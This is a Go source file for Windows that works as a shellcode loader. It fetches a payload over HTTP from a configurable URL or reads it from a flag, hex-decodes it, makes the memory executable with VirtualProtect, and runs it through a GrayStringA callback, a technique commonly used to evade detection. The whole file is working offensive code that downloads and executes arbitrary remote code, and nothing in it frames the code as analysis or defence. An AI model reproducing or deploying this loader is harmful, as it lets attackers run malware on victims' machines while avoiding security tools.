

package main

import (
	"encoding/hex"
	"unsafe"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"os"
	"flag"
	"fmt"
	"log"
)

var (
	kernel32 		= windows.NewLazySystemDLL("kernel32.dll")
	user32 			= windows.NewLazySystemDLL("user32.dll")

	VirtualProtect  = kernel32.NewProc("VirtualProtect")
	GrayString 		= user32.NewProc("GrayStringA")
)

func main() {
	shellcodePath := flag.String("shellcode", "", "Path to the shellcode file")
    shellcodeURL := flag.String("shellcode-url", "http://127.0.0.1:8080/download/calc", "URL of the shellcode file")

	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()
	var shellcodeHex string // Declare shellcodeHex outside if/else blocks
	var err error
	if *shellcodeURL == "" {
		// If not provided, check if the shellcode path is provided
		if *shellcodePath == "" {
			// If neither shellcode URL nor shellcode path is provided, exit with an error
			log.Fatal("Please provide either the URL or the path to the shellcode file")
		}
		shellcodeBytes := *shellcodePath
		
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = shellcodeBytes
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString([]byte(shellcodeBytes))
		}
		
	} else {
		// Read from URL
		// Make HTTP GET request to fetch from URL
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			log.Fatalf("Error fetching shellcode from URL: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Fatalf("Failed to fetch shellcode from URL: %s", resp.Status)
		}

		shellcodeBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Error reading shellcode from response body: %v", err)
		}

		// Check if shellcode is already in hexadecimal format
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = string(shellcodeBytes)
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString(shellcodeBytes)
		}
	

		
	}
	
	
	shellcode, errShellcode := hex.DecodeString(shellcodeHex)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	oldProtect := windows.PAGE_READWRITE
	VirtualProtect.Call((uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	GrayString.Call(0, 0, (uintptr)(unsafe.Pointer(&shellcode[0])), 1, 2, 3, 4, 5, 6);
}